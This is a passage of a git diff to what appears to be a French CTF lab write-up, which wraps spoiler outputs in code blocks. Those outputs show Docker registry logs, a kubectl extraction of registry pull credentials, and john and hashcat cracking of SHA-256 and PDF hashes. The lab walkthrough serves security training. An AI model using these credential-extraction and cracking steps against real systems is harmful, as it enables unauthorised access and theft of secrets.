 1[...expurgé...]3 - - [29/Oct/2024:10:07:01 +0000] "GET /v2/wishlistweb/manifests/latest HTTP/1.1" 404 96 "" "docker/19.03.12 go/go1.13.10 git-commit/48a66213fe kernel/4.15.0-213-generic os/linux arch/amd64 UpstreamClient(Docker-Client/19.03.12 \\(linux\\))"
 1[...expurgé...]3 - - [29/Oct/2024:10:35:03 +0000] "GET /v2/ HTTP/1.1" 401 87 "" "docker/19.03.12 go/go1.13.10 git-commit/48a66213fe kernel/4.15.0-213-generic os/linux arch/amd64 UpstreamClient(Docker-Client/19.03.12 \\(linux\\))"
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -2010,8 +2254,12 @@ grep "1[...expurgé...]3" docker-registry-logs.log | grep -i "patch" | head -n 5
 ```
 
 {% capture spoil %}
+
+```txt
 1[...expurgé...]3 - - [...expurgé...        +0000] "PATCH /v2/wishlistweb/blobs/uploads/[...expurgé...]"
 1[...expurgé...]3 - - [29/Oct/2024:12:34:31 +0000] "PATCH /v2/wishlistweb/blobs/uploads/[...expurgé...]"
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -2020,7 +2268,11 @@ kubectl get secret pull-creds -n wareville -o jsonpath='{.data.\.dockerconfigjso
 ```
 
 {% capture spoil %}
+
+```json
 {"auths":{"http://docker-registry.nicetown.loc:5000":{"username":"[...expurgé...]","password":"[...expurgé...]","auth":"[...expurgé...]"}}}
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -2035,6 +2287,8 @@ john --format=raw-sha256 -w=/usr/share/wordlists/rockyou.txt hash1.txt --rules=w
 ```
 
 {% capture spoil %}
+
+```txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
 Warning: poor OpenMP scalability for this hash type, consider --fork=2
@@ -2046,6 +2300,8 @@ Enabling duplicate candidate password suppressor
 1g 0:00:00:16 DONE (2024-12-30 21:48) 0.06165g/s 2391Kp/s 2391Kc/s 2391KC/s markie182..cherrylee2
 Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
 Session completed.
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -2056,6 +2312,8 @@ hashcat -m 1400 'd956a72c83a895cb767bb5be8dba791395021dcece002b689cf3b5bf5aaa20a
 ```
 
 {% capture spoil %}
+
+```txt
 hashcat (v6.2.6) starting
 
 [...expurgé pour brièveté...]
@@ -2078,6 +2336,8 @@ Guess.Mod........: Rules (rules/Hashcat/best64.rule)
 
 Started: Mon Dec 30 23:50:55 2024
 Stopped: Mon Dec 30 23:50:58 2024
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -2095,6 +2355,8 @@ john --format=PDF -w=wordlist.txt pdf.hash --rules=single
 ```
 
 {% capture spoil %}
+
+```txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
 Cost 1 (revision) is 3 for all loaded hashes
@@ -2106,6 +2368,8 @@ Enabling duplicate candidate password suppressor
 1g 0:00:00:00 DONE (2024-12-30 22:00) 4.167g/s 5066p/s 5066c/s 5066C/s mayored..afluffy
 Use the "--show --format=PDF" options to display all of the cracked passwords reliably
 Session completed.
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -2118,11 +2382,15 @@ head -n 5 private.txt
 ```
 
 {% capture spoil %}
+
+```txt
 transactions
 
 THM{[...expurgé...]}
 date
 transaction_ref
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
